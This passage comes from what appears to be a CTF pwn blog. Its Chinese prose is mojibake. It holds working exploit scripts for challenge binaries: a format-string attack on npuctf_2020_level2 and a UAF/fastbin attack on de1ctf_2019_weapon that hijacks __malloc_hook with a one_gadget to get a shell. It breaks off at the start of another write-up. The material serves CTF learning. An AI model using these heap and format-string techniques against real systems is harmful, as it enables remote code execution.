class="line">one_2_27_32=[<span class="number">0x3d123</span>,<span class="number">0x3d125</span>,<span class="number">0x3d129</span>,<span class="number">0x3d130</span>,<span class="number">0x67b4f</span>,<span class="number">0x67b50</span>,<span class="number">0x1380be</span>,<span class="number">0x1380bf</span>]</span><br><span class="line">one_2_27_64=[<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">one_2_27_buu32=[<span class="number">0x3cbea</span>,<span class="number">0x3cbec</span>,<span class="number">0x3cbf0</span>,<span class="number">0x3cbf7</span>,<span class="number">0x6729f</span>,<span class="number">0x672a0</span>,<span class="number">0x13573e</span>,<span class="number">0x13573f</span>]</span><br><span class="line">one_2_27_buu64=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span>,ip=<span class="string">&#x27;node4.buuoj.cn&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> one</span><br><span class="line">    bit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> context.arch==<span class="string">&#x27;amd64&#x27;</span>:bit=<span class="number">64</span></span><br><span class="line">    <span class="keyword">else</span>:bit=<span class="number">32</span></span><br><span class="line">    one=<span class="built_in">eval</span>(<span class="string">&#x27;one_&#x27;</span>+libc_version.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;_&#x27;</span>)+<span class="string">&#x27;_&#x27;</span>+(<span class="keyword">not</span> x)*<span class="string">&#x27;buu&#x27;</span>+<span class="built_in">str</span>(bit))</span><br><span class="line">    libc=<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-&#x27;</span>+(<span class="keyword">not</span> x)*<span class="string">&#x27;buu&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        context.log_level=<span class="number">20</span></span><br><span class="line">        p=remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),ELF(libc),p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;note: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,length,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note: &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;note: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./npuctf_2020_level2&#x27;</span>,port=<span class="number">26764</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;%7$p\n%9$p\n%11$p\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x21b97</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">code_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x79a</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&#x27;code_addr:&#x27;</span>+<span class="built_in">hex</span>(code_addr))</span><br><span class="line"></span><br><span class="line">shell=libc_addr+one[<span class="number">0</span>]</span><br><span class="line">success(<span class="string">&#x27;shell:&#x27;</span>+<span class="built_in">hex</span>(shell))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">8</span>:<span class="keyword">break</span></span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr&amp;<span class="number">0xffff</span>)+i).encode()+<span class="string">b&#x27;c%9$hn\n\0&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    val=shell&amp;<span class="number">0xffff</span></span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(val).encode()+<span class="string">b&#x27;c%35$hn\n\0&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    success(<span class="string">&#x27;debug:&#x27;</span>+<span class="built_in">hex</span>(val))</span><br><span class="line">    shell&gt;&gt;=<span class="number">16</span></span><br><span class="line">    </span><br><span class="line">success(<span class="string">&#x27;one:&#x27;</span>+<span class="built_in">hex</span>(libc_addr+one[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;66666666\0&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>de1ctf_2019_weapon writeup</title>
      <link href="/2021/11/07/de1ctf_2019_weapon/"/>
      <url>/2021/11/07/de1ctf_2019_weapon/</url>
      
        <content type="html"><![CDATA[<p>buuåˆ·é¢˜è®°å½•â€”<a href="https://buuoj.cn/challenges#de1ctf_2019_weapon">de1ctf_2019_weapon</a></p><span id="more"></span><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><p>checksecä¸€æ³¢ï¼Œä¿æŠ¤å…¨å¼€ï¼Œidaåˆ†æï¼Œå‘ç°æ—¶ç»å…¸çš„å †èœå•é¢˜ç›®ã€‚æœ‰addï¼Œdeleteå’Œeditæ“ä½œï¼Œæ²¡æœ‰showå‡½æ•°ï¼Œå¹¶ä¸”ä¿æŠ¤å…¨å¼€æ— æ³•åŠ«æŒgotè¡¨ã€‚é‚£ä¹ˆè¿™é¢˜å¤§æ¦‚ç‡æ˜¯è¦ç”¨IOæ¥æ³„éœ²libcäº†ã€‚</p><p>addå‡½æ•°æŠŠå †å—ç”³è¯·èŒƒå›´é™åˆ¶åœ¨äº†0x60ä»¥å†…ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªèƒ½ç”³è¯·fastbinå¤§å°çš„å †å—ã€‚editå‡½æ•°å°±æ˜¯ä¸­è§„ä¸­çŸ©çš„æŒ‰ç…§ä¹‹å‰çš„sizeä¿®æ”¹å †å—çš„å†…å®¹ã€‚deleteå‡½æ•°åœ¨å †å—è¢«freeä¹‹åæ²¡æœ‰æŠŠæŒ‡é’ˆç½®ç©ºå­˜åœ¨UAFçš„æ¼æ´ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å¤§æ¦‚å°±æ˜¯å…ˆé€šè¿‡uafè¿›è¡Œå †å—é‡å ç„¶åä¿®æ”¹sizeï¼Œfreeä¹‹åå¾—åˆ°ä¸€ä¸ªunsorted binï¼Œç„¶åå†ä¿®æ”¹å›fastbinå°†å®ƒç”³è¯·åˆ°stdouté™„è¿‘é€šè¿‡IOæ³„éœ²libcåœ°å€ï¼Œæœ€åå†æ¥ä¸€æ¬¡fastbin attackåŠ«æŒmalloc hookæ”¾ä¸Šonegadget å»getshellï¼Œè¿™é¢˜éœ€è¦ç”¨realloc è°ƒæ•´æ ˆæ¥é€‚åº”onegadgetï¼Œæˆ‘ä»¬åé¢å†è¯´ã€‚</p><h2 id="æ³„éœ²libcçš„åœ°å€"><a href="#æ³„éœ²libcçš„åœ°å€" class="headerlink" title="æ³„éœ²libcçš„åœ°å€"></a>æ³„éœ²libcçš„åœ°å€</h2><p>å› ä¸ºåœ°å€éƒ½æ˜¯æœªçŸ¥çš„ï¼Œæ‰€ä»¥ä¸€å¼€å§‹è¦é€šè¿‡é‡Šæ”¾ä¸¤ä¸ªç›¸åŒå¤§å°çš„fastbinæ¥è®©å…¶ä¸­ä¸€ä¸ªfastbinä¸­ç•™ä¸‹å¦ä¸€ä¸ªfastbinçš„åœ°å€ï¼Œå†é€šè¿‡ä¿®æ”¹æœ€åä¸€å­—èŠ‚è®©fastbinçš„fdæ¥è®©ç¬¬äºŒä¸ªchunkç”³è¯·åˆ°å¯ä»¥é€ æˆå †é‡å çš„åœ°æ–¹ä¾¿äºæˆ‘ä»¬ä¿®æ”¹sizeã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x61</span>))<span class="comment">#åœ¨åˆé€‚çš„åœ°æ–¹ä¼ªé€ chunk</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#æå‰freeè®©fastbinä¸­å­˜åœ¨è¿™ä¸ªchunk</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/07/de1ctf_2019_weapon/1.png" alt="1"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªchunkçš„fdå·²ç»æœ‰äº†ç¬¬å››ä¸ªchunkçš„åœ°å€ï¼Œå¹¶ä¸”åœ¨ç¬¬ä¸€ä¸ªå †å—ä¸­å­˜åœ¨ä¸€ä¸ªä¼ªé€ çš„0x61ä½œä¸ºfake chunkçš„sizeï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬åªè¦edit 0 \x50å°±èƒ½å¤Ÿäº§ç”Ÿfastbin attackäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p8(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x91</span>))<span class="comment">#ä¿®æ”¹ç¬¬äºŒä¸ªå †å—çš„size</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#é‡Šæ”¾unsorted bin è®©binçš„fdä¸­ç•™ä¸‹libcçš„åœ°å€</span></span><br><span class="line">edit(<span class="number">1</span>,p16(<span class="number">0xa5dd</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">7</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">0.5</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x3c5600</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ³¢æ“ä½œå°±èƒ½æˆåŠŸæ³„éœ²libcäº†ï¼Œä½†æ˜¯ç”±äºå†…å­˜é¡µæ˜¯åä¸‰ä½å¯¹é½ï¼Œæˆ‘ä»¬å¡«å……æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦çˆ†ç ´ä¸€åŠä¸ªå­—èŠ‚ã€‚</p><h2 id="åŠ«æŒmalloc-hook"><a href="#åŠ«æŒmalloc-hook" class="headerlink" title="åŠ«æŒmalloc_hook"></a>åŠ«æŒmalloc_hook</h2><p>è¿™é‡Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå°±æ˜¯é€šè¿‡uafçš„æ–¹æ³•æŠŠå †å—ç”³è¯·åˆ°malloc_hook-0x23çš„åœ°æ–¹ï¼Œå†™mallochookä¸ºreallochookï¼Œå†æŠŠrealloc hookå†™ä¸Šå¯¹åº”çš„one gadgetï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯reallocä¸ä¸€å®šç›´æ¥å°±è¡Œäº†ï¼Œéœ€è¦é€‚å½“è·³è¿‡ä¸€äº›pushæˆ–è¿™popä¹‹ç±»çš„æŒ‡ä»¤æ¥è°ƒæ•´æ ˆä¸­çš„0åˆ°åˆé€‚çš„ä½ç½®ï¼Œè¿™é‡Œæˆ‘ç”¨äº†ç¬¬2ä¸ªonegadgetï¼Œç”¨realloc + 4çš„åœ°æ–¹æ¥è°ƒæ•´æ ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#one=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span>+p64(libc_addr+one[<span class="number">1</span>])+p64(libc_addr+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>æœ€åé™„ä¸Šçˆ†ç ´çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29410</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,index,name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;name:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;idx :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;content:&#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./de1ctf_2019_weapon&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x61</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x18</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">0</span>,p8(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x58</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x58</span>,<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p16(<span class="number">0xa5dd</span>))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">7</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">0.5</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x3c5600</span></span><br><span class="line">    success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#one=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">    one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span>+p64(libc_addr+one[<span class="number">1</span>])+p64(libc_addr+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><p><img src="/2021/11/07/de1ctf_2019_weapon/2.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021æµ™æ±Ÿçœèµ›pwn2å¤ç›˜</title>
      <link href="/2021/11/06/zjctf2021%20pwn2/"/>
      <url>/2021/11/06/zjctf2021%20pwn2/</url>
      
        <content type="html"><![CDATA[<p>è¿™é¢˜åœ¨æ¯”èµ›æ˜¯æ²¡æœ‰åšå‡ºæ¥çš„ï¼Œå±äºèµ›åå¤ç›˜ï¼Œä½†æ˜¯æ„Ÿè§‰è¿™é¢˜ä¸è¯¥åœ¨æ¯”èµ›åšä¸å‡ºæ¥ï¼Œå› ä¸ºèµ›åèŠ±äº†ä¸¤å°æ—¶å°±å‡ºäº†ã€‚</p><span id="more"></span><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><p>é¦–å…ˆchecksecå‘ç°ä¿æŠ¤å…¨å¼€äº†ï¼Œidaæ‰“å¼€ï¼Œä¸»å‡½æ•°æ˜¯ä¸€ä¸ªwhile 1 å¾ªç¯ä¸”æ²¡æœ‰returnï¼Œå¦‚æœè¦æ ˆæº¢å‡ºå¾—åœ¨å…¶å®ƒå‡½æ•°ã€‚é¦–å…ˆidaåˆ†ææœ‰éƒ¨åˆ†ä¸åˆ°ä½ï¼Œæœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„å€¼èµ‹å€¼æŒ‡é’ˆï¼Œç„¶ååé¢è¿˜æœ‰å¯¹æŒ‡é’ˆä¹‹åçš„å…ƒç´ è¯»å–ä¸€ä¸ªintå‹å˜é‡ï¼Œå¾ˆæ˜æ˜¾æ ˆå¸ƒå±€æ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char buf[]</span><br><span class="line"></span><br><span class="line">char *ptr</span><br><span class="line">int size</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å»æ··æ·†ä¸€ä¸‹ï¼Œå»é™¤é‚£ä¸ªæŒ‡é’ˆåˆšå¥½æ˜¯31ä¸ªint_64ï¼ŒæŠŠå®ƒæ”¹å˜ä¸€ä¸‹å°±æ˜¯char buf[248]ï¼Œå¦‚ä¸‹æ›´æ–¹ä¾¿åˆ†æ(isnanå‡½æ•°æ˜¯å› ä¸ºå»é™¤äº†alarmæ–¹ä¾¿è°ƒè¯•)</p><p><img src="/2021/11/06/zjctf2021%20pwn2/1.png" alt="1"></p><p>å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ä¸­é—´æœ‰ä¸¤å±‚æ£€æµ‹ï¼Œä½†æ˜¯ä¸€æ—¦ä¸æ»¡è¶³æœ€å¤–å±‚é‚£ä¸ªæ£€æµ‹é‚£ä¹ˆå°±ä¼šå¾ªç¯è¾“å‡º<code>too easy</code>ï¼Œå› 